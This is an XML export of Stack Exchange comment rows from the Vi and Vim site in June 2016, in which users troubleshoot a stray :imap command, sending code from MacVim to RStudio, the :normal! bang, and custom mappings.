  <row Id="13767" PostId="8184" Score="0" Text="@w.brian  Do you want a horizontal bar like appearance showing column number below every character? (This will be applicable only for current line where the cursor is)" CreationDate="2016-06-11T06:01:23.603" UserId="7161" />
  <row Id="13768" PostId="8187" Score="2" Text="Those aren't errors. What you see is the output of a stray `:imap` command." CreationDate="2016-06-11T07:44:13.580" UserId="54" />
  <row Id="13769" PostId="8187" Score="0" Text="A stray :imap command? Do I need to show my entire .vimrc, or can you tell which command it is from looking at this snippet?" CreationDate="2016-06-11T07:47:23.750" UserId="7960" />
  <row Id="13770" PostId="8187" Score="1" Text="Yes, show us your `vimrc`." CreationDate="2016-06-11T07:49:12.477" UserId="54" />
  <row Id="13771" PostId="8187" Score="1" Text="http://paste.ubuntu.com/17200916/" CreationDate="2016-06-11T07:52:54.907" UserId="7960" />
  <row Id="13772" PostId="8188" Score="1" Text="You're asking us to program your fancy idea. How about just using `&quot;*y` and copying it to RStudio yourself." CreationDate="2016-06-11T08:30:15.977" UserId="6300" />
  <row Id="13773" PostId="8188" Score="0" Text="That is what I'm doing now, so I want to speed up my coding. I know there is VimMode in RStudio, but it would be better for me to use MacVim itself. I've found similar thing can be done in GVIM ([latest comments in this discussion](https://support.rstudio.com/hc/en-us/community/posts/208030898-External-VIM-editor-again-)). Same in MacVim?" CreationDate="2016-06-11T08:33:31.610" UserId="6897" />
  <row Id="13774" PostId="8187" Score="1" Text="One of your plugins with a command like `:au BufEnter *.* :imap ` may cause this output to be shown everytime. When you open a file." CreationDate="2016-06-11T08:33:39.347" UserId="7161" />
  <row Id="13775" PostId="8188" Score="0" Text="It may be doable by calling some Applescript within vim which does all the steps you want to (activate RStudio, selecting textwindow, pasting, selecting some menu item from GUI, etc.). But that is terribly ugly and very slow, if you've ever seen that. Also is there no way to execute `R` from the terminal?" CreationDate="2016-06-11T08:39:42.647" UserId="6300" />
  <row Id="13776" PostId="8188" Score="0" Text="You can do that. If you know the command line to access rstudio (or the R compiler itself) and pass arguments for it, you can. An example  with shell : `system('expression') ` will do. You can insert the line into this expression or create a function which takes the lines and pass it to compiler or any other executable. Give dome example lines and the command line for executing in R. I am not aware whether you use MacVim within RStudio, like vrapper in eclipse. Give more details." CreationDate="2016-06-11T08:40:49.863" UserId="7161" />
  <row Id="13777" PostId="8188" Score="0" Text="@SibiCoder I think `Nvim-R` does the similar thing (passing a line from Vim to R run in Terminal). I currently run MacVim and RStudio independently (just open them one by one), not MacVim in RStudio." CreationDate="2016-06-11T08:46:56.720" UserId="6897" />
  <row Id="13778" PostId="8188" Score="0" Text="Can you tell me how dk you run the commands ? (The command used to run from terminal) give some screen shots or example text for better understanding" CreationDate="2016-06-11T08:59:19.187" UserId="7161" />
  <row Id="13779" PostId="8188" Score="0" Text="Do you mean commands to run MacVim? I use GUI version, so simply by double-clicking the icon. Since RStudio is also an app, I'm wondering whether I can use system commands (such as cmd-tab to switch from MacVim to RStudio and ctrl-v for pasting) via MacVim." CreationDate="2016-06-11T09:04:28.330" UserId="6897" />
  <row Id="13780" PostId="8183" Score="0" Text="If you add a bang after `:normal`, does it change anything? A bang just after `:normal` means that the keys you give as an argument won't be remapped. If the keys are not remapped, maybe your autocmd will simply set marks and not call `netrw` or `NERDTree`'s functions." CreationDate="2016-06-11T09:06:56.533" UserId="6960" />
  <row Id="13781" PostId="8188" Score="0" Text="Not those. You may have commands to run a R script, may be like 'R script name'. You can directly use that command inside vim like `:system ('R script name')`" CreationDate="2016-06-11T09:10:41.487" UserId="7161" />
  <row Id="13782" PostId="8188" Score="0" Text="I understand. In RStudio, there are two ways to run lines. (1) In an editor in RStudio, ctrl-enter runs the line (or selected chunk). (2) copy and paste line(s) to the console in RStudio. [This video on YouTube](https://youtu.be/uwlwNRbaKMI?t=6m14s) might give you an idea of how RStudio works." CreationDate="2016-06-11T09:20:16.593" UserId="6897" />
  <row Id="13783" PostId="8189" Score="0" Text="You want to select a word and arguments next to it, right? Are you okay with some other mappings then?" CreationDate="2016-06-11T09:26:51.347" UserId="7161" />
  <row Id="13784" PostId="8189" Score="0" Text="Well, yes, show me." CreationDate="2016-06-11T09:28:00.317" UserId="6300" />
  <row Id="13785" PostId="8189" Score="0" Text="How about `:nmap \sf bvf(f)`?" CreationDate="2016-06-11T09:34:02.940" UserId="7161" />
  <row Id="13786" PostId="7691" Score="0" Text="Yes, if you read closely, you'll see I linked to that question in mine, and specifically explained what I found lacking about it / its answer." CreationDate="2016-06-11T10:48:18.300" UserId="4985" />
  <row Id="13787" PostId="8183" Score="1" Text="@user9433424 thanks alot! I've added the `!` and so far its working nicely. I knew the `!` after a function name would allow you to redefine the function. But I didn't know about the `!`  in autocmd / `normal` statements. so it basically locks the command in, so that it can't be remapped? . Thanks!" CreationDate="2016-06-11T11:23:07.167" UserId="4603" />
  <row Id="13788" PostId="8183" Score="0" Text="I'm glad it helped! Yes, I think what you said is right, it basically locks the command in. They talk about this in `:help :normal`. Also in the 15th and 16th chapter of Learn Vimscript the Hard Way. There are various Ex commands whose behavior is changed when you append a bang to them (like `:retab` or `:join`). When you think your problem is solved, you could post your solution as an answer." CreationDate="2016-06-11T12:01:33.600" UserId="6960" />
  <row Id="13789" PostId="8183" Score="0" Text="@user9433424 yes, I looked at the answer romainl gave on my previous question, and he used `:normal!` form too. So based on my testing and the assumption romainl has likely used the command without issues I guess its a workable answer that might help others." CreationDate="2016-06-11T12:07:38.007" UserId="4603" />
  <row Id="13790" PostId="8193" Score="1" Text="* in f*oo is the cursor." CreationDate="2016-06-11T15:03:13.103" UserId="7161" />
  <row Id="13791" PostId="8187" Score="0" Text="@Akiva line 220 in that paste is your problem.  Like romainl said, it's a stray `:imap` command.  Using `:i[nore]map` without any arguments prints all of the insert maps." CreationDate="2016-06-11T15:12:55.047" UserId="5229" />
  <row Id="13793" PostId="8113" Score="0" Text="By looking at the Vim help for `encoding` and `charconvert` I saw that it internally tries to use the `iconv` function first to convert character sets. `iconv` can handle conversion between different character sets. An answer on to how to add a character set to `iconv` can be found [here](https://forums.suse.com/archive/index.php/t-4698.html) (seems you have to mail the maintainer). Maybe this helps you. :)" CreationDate="2016-06-11T17:46:17.457" UserId="5011" />
  <row Id="13794" PostId="8197" Score="0" Text="Do you want a mouse solution or is a command line solution okay? Also, how do you want the new file to open? In a new tab? New buffer? Replace the current file?" CreationDate="2016-06-11T18:31:54.630" UserId="2920" />
  <row Id="13795" PostId="8196" Score="0" Text="Why would you insert those operations in the first place, on an empty line? It's normal that &quot;change to where you find an `a`&quot; fails (when there is no `a`), so the change operation is cancelled. On an empty line, you simply hit `i` (or `S`) .." CreationDate="2016-06-11T18:38:42.413" UserId="1800" />
  <row Id="13796" PostId="8196" Score="0" Text="I believe I have illustrated my intention. With the above remap &lt;kbd&gt;c&lt;/kbd&gt;&lt;kbd&gt;a&lt;/kbd&gt; will enter insert mode no matter if there is a &quot;asdfz&quot;, &quot;abc&quot;, or nothing at all. I only want it to enter insert mode, if there is &quot;asdfz&quot;." CreationDate="2016-06-11T18:43:23.730" UserId="6300" />
  <row Id="13797" PostId="8200" Score="5" Text="`has('java')`? That will *always* return 0. Java is not a &quot;feature&quot; of Vim. You haven't said where these &quot;specified key commands&quot; are from. Which plugin?" CreationDate="2016-06-11T19:53:20.910" UserId="205" />
  <row Id="13798" PostId="8196" Score="0" Text="I see. For your question - there are more powerful ways of defining text-objects/motions/operators, but they involve calling &quot;real&quot; vimscript functions. There are even plugins that build on that: https://github.com/kana/vim-textobj-user (the idea is that, using functions, you can achieve what you want - you can check for example if you have an `a` on your line, or your line is empty etc. and enter - or not - insert mode from your function (mapped to your keys)." CreationDate="2016-06-11T21:24:45.170" UserId="1800" />
  <row Id="13799" PostId="8198" Score="0" Text="The questioner would like to &quot;[s]end a line where the cursor is in MacVim to *RStudio*&quot;." CreationDate="2016-06-11T21:29:03.047" UserId="2932" />
  <row Id="13800" PostId="8199" Score="0" Text="That works great! Thanks!" CreationDate="2016-06-11T22:33:48.370" UserId="7260" />
</comments>